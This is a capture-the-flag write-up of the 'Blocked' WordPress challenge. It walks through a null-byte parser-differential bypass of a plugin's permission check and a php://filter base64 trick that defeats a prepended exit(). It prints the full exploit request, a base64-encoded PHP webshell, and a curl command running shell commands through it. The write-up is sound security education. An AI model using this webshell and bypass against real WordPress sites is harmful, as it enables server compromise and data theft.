# Blocked

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
    - [Bypassing Validations](#bypassing-validations)
    - [Arbitrary File Write](#arbitrary-file-write)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 7 solves / 919 points
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

it's blocked, nothing to do here.

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224223812.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/Blocked/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Blocked)-[2025.02.24|22:38:34(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Blocked)-[2025.02.24|22:38:35(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
  inflating: server-given/.DS_Store  
   creating: server-given/docker/
   creating: server-given/docker/wordpress/
   creating: server-given/docker/wordpress/toolbox/
  inflating: server-given/docker/wordpress/toolbox/Makefile  
   creating: server-given/docker/wordpress/toolbox/plugins/
   creating: server-given/docker/wordpress/toolbox/plugins/test-plugin/
  inflating: server-given/docker/wordpress/toolbox/plugins/test-plugin/test-plugin.php  
  inflating: server-given/docker/wordpress/toolbox/Dockerfile  
 extracting: server-given/flag.txt   
  inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Just like my writeup for the other challenges, we should first take a look at the `docker/wordpress/toolbox/Makefile` file:

```bash
[...]
$(WP_CLI) plugin activate test-plugin
[...]
@chmod -R 755 /var/www/html/wp-content/uploads/
```

In here, the WordPress site is installed with a plugin called `test-plugin`. It also set the directory `/var/www/html/wp-content/uploads/`'s permission to writable and readable.

After a quick look of the plugin's source code, we can see that it has registered a REST API route at path `/test/upload/<somevalue>` with callback function `upload_something` and permission callback function `check_request`:

```php
function register_endpoints(){
    register_rest_route( 'test', '/upload/(?P<somevalue>\w+)', [
        'methods' => WP_Rest_Server::CREATABLE,
        'callback' => 'upload_something',
        'permission_callback' => 'check_request',
    ]);
}
```

As well as an option called `secretword_is_true` with the value of string `anything`:

```php
add_action("init", "set");
[...]
function set(){
    update_option("secretword_is_true", "anything");
}
```

Let's look at the callback function `upload_something` first. In this function, it basically allows us to create arbitrary PHP file with our own content in it:

```php
function upload_something($request){
    $body = $request->get_json_params();
    $content = $body['content'];
    $name = $body['name'];
    [...]
    $write = <<<EOF
        <?php
            exit('ha?');
            // $content

    EOF;

    file_put_contents($name . '.php', $write);
    return rest_ensure_response( "success" );
}
```

However, there are some caveats, in which we'll talk about this later. With that said, our goal of this challenge is to **write arbitrary PHP code** via callback function `upload_something`.

### Bypassing Validations

Now, before it invoke the callback function `upload_something`, it first checks the permission via function `check_request`:

```php
function check_request( $request ) {
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if( empty( $some_value ) ) {
       return false;
    }
 
    if( ! preg_match( '/^secretword_/i', $some_value) ) {
       return false;
    }
 
    if( $some_value == 'secretword_is_true' ) {
       return false;
    }
    
    return true;
}
```

Which checks if the request parameter `somevalue` is starts with `secretword_` and is not loosely equal to string `secretword_is_true`.

If all the validations are passed (Return `true`), the callback function `upload_something` will be invoked. However, in this callback function, it also has some validations:

```php
function upload_something($request){
    $body = $request->get_json_params();
    [...]
    $name = $body['name'];
    $some_value = trim( strtolower( $request['somevalue'] ) );

    if(!get_option($some_value)){
        echo "blocked";
        exit(); 
    }

    if(strlen($name) > 105){
        echo "blocked.";
        exit();
    }
    [...]
}
```

As you can see, it'll first check if the option name (Our request parameter `somevalue`'s value) returns a truthy value or not. By default, if the option name doesn't exist, WordPress function [`get_option`](https://developer.wordpress.org/reference/functions/get_option/) will return default value boolean `false`. Then, it'll check our JSON attribute `name`'s value length is greater than 105 or not.

With that said, this callback function requires us to provide request parameter `somevalue` with the value of any existing options in the WordPress site, as well as our JSON attribute `name`'s value length must be less than 105.

But wait, if parameter `somevalue` is other existing options, then we wouldn't pass the permission callback function `check_request`! Because the option name is not started with `secretword_`. So, if we bypassed permission callback function `check_request`, we'll not be able to pass the `get_option` check in the callback function `upload_something`.

To bypass both validations, we need to find a **parser differential** in our request's `somevalue` parameter.

In the REST API route's URL parameter regex pattern, we can see that parameter `somevalue` only allows any word character (Equivalent to `[a-zA-Z0-9_]`). However, since both validations didn't enforce which body data format that we're allowed to use, we can leverage **Unicode characters in JSON** to create a parser differential.

According to the JSON's RFC ([RFC 8259](https://datatracker.ietf.org/doc/html/rfc8259)), [section 7. "Strings"](https://datatracker.ietf.org/doc/html/rfc8259#section-7), Unicode characters is used with a `\u` escape sequence. For example, if we want to use a null byte (`\x00`), we can use this Unicode character: `\u0000`.

Now, here's the question: What if we provide JSON attribute `somevalue` with the value of a string that includes a **null byte** using Unicode escape sequence? Let's try this!

```http
POST /?rest_route=/test/upload/anything HTTP/1.1
Host: 52.77.81.199:9199
Content-Length: 92
Content-Type: application/json;charset=UTF-8

{
    "name": "foo",
    "somevalue": "secretword_\u0000is_true",
    "content": "bar"
}
```

Response:

```http
HTTP/1.1 200 OK
[...]
Content-Length: 9
Content-Type: application/json; charset=UTF-8

"success"
```

Huh? Why did we bypass both validations??

The first validation, permission callback function `check_request`, is bypassed is because our `$some_value` is `secretword_\0is_true`.

But why the second validation, callback function `upload_something`, also bypassed? Isn't function `get_option` return boolean `false` because option `secretword_\0is_true` doesn't exist?

If we setup our own WordPress site, install the `test-plugin`, and start debugging with [Xdebug](https://xdebug.org/), we can see that WordPress function `get_option` is basically calling WordPress function `get_row`, which ultimately calling PHP function [`mysqli_query`](https://www.php.net/manual/en/function.mysql-query.php):

https://github.com/user-attachments/assets/e45793eb-a718-425d-b11b-c2ffab8b0856

Turns out, in MySQL, if a string contains null byte(s) (`\0`), it'll have this very interesting behavior:

```shell
mysql> SELECT 'secretword_\0is_true';
+---------------------+
| secretword_         |
+---------------------+
| secretword_ is_true |
+---------------------+
mysql> SELECT * FROM wp_options WHERE option_name = 'secretword_\0is_true';
+-----------+--------------------+--------------+----------+
| option_id | option_name        | option_value | autoload |
+-----------+--------------------+--------------+----------+
|       188 | secretword_is_true | anything     | auto     |
+-----------+--------------------+--------------+----------+
```

It seems that although the null byte is silently dropped, the `WHERE` clause will still match the correct option name even if it doesn't contain any null bytes.

Therefore, we can bypass the validations via **parser differential between the PHP and MySQL's weird behavior**.

After we bypassed all the validations, we can now write arbitrary PHP code!

### Arbitrary File Write

Now, the PHP script that we're writing is in the comment section. It also immediately call PHP function [`exit`](https://www.php.net/manual/en/function.exit.php) to stop its execution:

```php
function upload_something($request){
    [...]
    $write = <<<EOF
        <?php
            exit('ha?');
            // $content

    EOF;

    file_put_contents($name . '.php', $write);
    [...]
}
```

Since **we can control the start of the filename**, we can leverage PHP filter chain to first remove the original PHP code by base64 decoding ([`convert.base64-decode`](https://www.php.net/manual/en/filters.convert.php)). Then, we can inject our content into the PHP script, which is a base64 encoded payload. Since our content is base64 encoded, the filter chain will decode our payload, which will be a valid PHP syntax. Finally, we'll use the `write` parameter to write our base64 decoded original code and the injected PHP code into a file. The PHP filter chain can be seen like this:

```
php://filter/write=convert.base64-decode/resource=./shell
```

But wait, we should write the PHP script into where? Fortunately, since directory `/var/www/html/wp-content/uploads/` is writable, we can write our PHP script into that directory.

## Exploitation

Armed with above information, we can write our PHP webshell via the following POST request:

```http
POST /?rest_route=/test/upload/anything HTTP/1.1
Host: 52.77.81.199:9199
Content-Length: 215
Content-Type: application/json;charset=UTF-8

{
    "name": "php://filter/write=convert.base64-decode/resource=/var/www/html/wp-content/uploads/shell",
    "somevalue": "secretword_is_\u0000true",
    "content": "aPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+"
}
```

Base64 decoded payload:

```php
<?php system($_GET["cmd"]); ?>
```

> Note: The `a` character in the beginning is for padding. Otherwise the base64 decode filter chain will combine the original code and decode the wrong payload.

After that, we can use our PHP webshell to get the flag:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Blocked)-[2025.02.26|17:46:49(HKT)]
└> curl --get http://52.77.81.199:9199/wp-content/uploads/shell.php --data-urlencode 'cmd=cat /flag*.txt'
��^�+ak��CTF{you_bypass_the_exit_nice_8b31009122dd}
```

- **Flag: `CTF{you_bypass_the_exit_nice_8b31009122dd}`**

## Conclusion

What we've learned:

1. Parser differential between the PHP and MySQL's weird behavior
2. PHP `exit()` bypass via PHP filter chain
